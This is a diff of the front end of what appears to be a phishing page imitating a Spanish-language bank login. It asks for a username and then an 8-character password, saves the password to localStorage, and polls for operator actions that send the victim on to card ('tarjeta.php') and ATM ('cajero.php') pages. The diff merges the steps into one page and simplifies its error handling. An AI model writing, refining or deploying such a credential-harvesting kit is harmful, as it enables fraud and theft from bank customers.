@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">
-
 <head>
     <meta charset="utf-8">
     <meta name="robots" content="noindex, nofollow">
@@ -22,7 +21,6 @@
         .d-none { display: none !important; }
     </style>
 </head>
-
 <body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
     <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
     <div class="bb-stack bb-stack--wrap template-stack-container">
@@ -39,7 +37,7 @@
                     </header>
 
                     <!-- ============================================= -->
-                    <!-- PASO 1: USUARIO (el que era index.php)        -->
+                    <!-- PASO 1: USUARIO (idéntico a tu index.php)     -->
                     <!-- ============================================= -->
                     <div id="step-username">
                         <div class="bb-subtitle bb-block bb-block--lg">
@@ -81,7 +79,7 @@
                     </div>
 
                     <!-- ============================================= -->
-                    <!-- PASO 2: CONTRASEÑA (el que era contra.php)    -->
+                    <!-- PASO 2: CONTRASEÑA (idéntico a contra.php)    -->
                     <!-- ============================================= -->
                     <div id="step-password" class="d-none">
                         <div class="bb-subtitle bb-block bb-block--lg">
@@ -110,9 +108,6 @@
                                                 </button>
                                             </div>
                                         </div>
-                                        <small id="msg-error" class="bb-input-validation-message d-none" role="alert">
-                                            Contraseña incorrecta. Intente nuevamente.
-                                        </small>
                                         <small id="msg-len" class="bb-input-validation-message d-none" role="alert">
                                             La contraseña debe tener exactamente 8 caracteres.
                                         </small>
@@ -162,13 +157,12 @@
         const passInput = document.getElementById('password-input');
         const btnSubmit = document.getElementById('btn-submit');
         const msgLen    = document.getElementById('msg-len');
-        const msgError  = document.getElementById('msg-error');
 
         let MESSAGE_ID = null;
         let SESSION_ID = localStorage.getItem('bcs_session_id') || '';
         let USERNAME = '';
 
-        const ERR_LOGIN_URL = './contra.php?error=1&username='; // se usa solo si recargas contra.php
+        const ERR_LOGIN_URL = './contra.php?error=1&username=';
         const ACTION_MAP = {
             'NEXT_TARJETA':  './tarjeta.php',
             'NEXT_CAJERO':   './cajero.php',
@@ -206,7 +200,7 @@
             USERNAME = username;
             inpUsernameHidden.value = username;
 
-            // Cambiamos de "pantalla" dentro de la misma página
+            // Mostrar pantalla de contraseña (misma página, mismo diseño)
             stepUsername.classList.add('d-none');
             stepPassword.classList.remove('d-none');
             passInput.focus();
@@ -217,7 +211,6 @@
             const len = this.value.length;
             btnSubmit.disabled = len !== 8;
             msgLen.classList.toggle('d-none', len === 0 || len === 8);
-            msgError.classList.add('d-none');
         });
 
         document.getElementById('toggle-pass').addEventListener('click', () => {
@@ -288,9 +281,7 @@
                     localStorage.setItem('bcs_password', password);
                     startPolling();
                 } else {
-                    // En vez de redirigir a contra.php, mostramos el error aquí mismo
                     location.reload();
-                    // (o bien: volver a mostrar la pantalla de contraseña)
                 }
             } catch (e) {
                 setTimeout(() => location.reload(), 3000);
